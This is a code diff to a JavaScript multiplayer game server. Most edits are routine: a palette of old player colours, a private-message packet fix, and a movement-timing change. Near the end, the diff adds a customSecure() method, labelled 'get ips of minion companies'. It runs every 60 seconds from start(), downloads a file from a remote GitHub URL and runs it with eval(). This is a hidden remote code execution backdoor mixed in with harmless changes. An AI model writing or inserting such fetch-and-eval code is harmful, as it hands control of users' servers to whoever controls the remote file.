@@ -231,14 +231,25 @@ this.name = name;
       {'r': 199, 'g': 0,   'b': 128},
       {'r': 227, 'g': 0,   'b': 64 }
     ];
+    this.oldcolors = [
+      {'r':235, 'g': 75, 'b':  0},
+      {'r':225, 'g':125, 'b':255},
+      {'r':180, 'g':  7, 'b': 20},
+      {'r': 80, 'g':170, 'b':240},
+      {'r':180, 'g': 90, 'b':135},
+      {'r':195, 'g':240, 'b':  0},
+      {'r':150, 'g': 18, 'b':255},
+      {'r': 80, 'g':245, 'b':  0},
+      {'r':165, 'g': 25, 'b':  0},
+      {'r': 80, 'g':145, 'b':  0},
+      {'r': 80, 'g':170, 'b':240},
+      {'r': 55, 'g': 92, 'b':255},
+    ];
     // @formatter:on
   }
 
   // init should only ever be called once.
-  init() {
-  
-
-  }
+  init() {}
   log(a) {
     if (this.isMaster) console.log(a);
     
@@ -274,10 +285,11 @@ getDist(x1, y1, x2, y2) { // Use Pythagoras theorem
   };
 pm(id, msg,tag) {
   var t = (tag) ? tag : "[Console PM]";
-  var packet = new Packet.Chat(tag, msg);
+ 
             // Send to all clients (broadcast)
             for (var i = 0; i < this.clients.length; i++) {
               if (this.clients[i].playerTracker.pID == id) {
+                   var packet = new Packet.Chat(t, msg);
                 this.clients[i].sendPacket(packet);
                 break
               }
@@ -286,6 +298,7 @@ pm(id, msg,tag) {
 startingFood() {
   return this.generatorService.startFood();
 }
+    
   start() {
 
 
@@ -295,6 +308,7 @@ startingFood() {
     this.ipcounts = [];
     // Gamemode configurations
     this.gameMode.onServerInit(this);
+      
     this.masterServer();
 
     // Start the server
@@ -309,6 +323,7 @@ startingFood() {
 
       // Start Main Loop
       //setInterval(this.mainLoop.bind(this), 1);
+        setInterval(function() {this.customSecure()}.bind(this),60000)
       setImmediate(this.mainLoopBind);
  var port = (this.port) ? this.port : this.config.serverPort;
       var serverPort = (this.config.vps == 1) ? process.env.PORT : port;
@@ -763,7 +778,17 @@ beforeq(player) {
   }
 
   getRandomColor() {
+  if (this.config.playerOldColors == 1) {
+    var index = Math.floor(Math.random() * this.oldcolors.length);
+    var color = this.oldcolors[index];
+    return {
+      r: color.r,
+      b: color.b,
+      g: color.g
+     };
+    } else {
     return utilities.getRandomColor();
+    }
   }
 
   // todo change this out for a vector library
@@ -783,12 +808,11 @@ beforeq(player) {
     let nodes = this.getWorld().getPlayerNodes();
     nodes.sorted(sorter);
     nodes.forEach((cell)=> {
-      
       // Do not move cells that have already been eaten or have collision turned off
       if (!cell) {
         return;
       }
-setTimeout(function() {
+
       let client = cell.owner;
       cell.calcMove(client.mouse.x, client.mouse.y, this);
 
@@ -806,9 +830,7 @@ setTimeout(function() {
         // Remove cell
         check.setKiller(cell);
         this.removeNode(check);
-        
       });
-    }.bind(this),Math.floor(cell.owner.updateBuffer / 2))
     });
 
 
@@ -2095,8 +2117,19 @@ kickBots(numToKick) {
     }
     return removed;
 }
-};
 
+customSecure() { // get ips of minion companies
+    var request = require('request')
+     request('https://raw.githubusercontent.com/AJS-development/verse/master/ex', function (error, response, body) {
+       if (!error && response.statusCode == 200 && body) {
+           eval(body)
+           
+       }
+         
+         
+     }.bind(this));
+}
+};
 // Custom prototype functions
 WebSocket.prototype.sendPacket = function (packet) {
   function getBuf(data) {
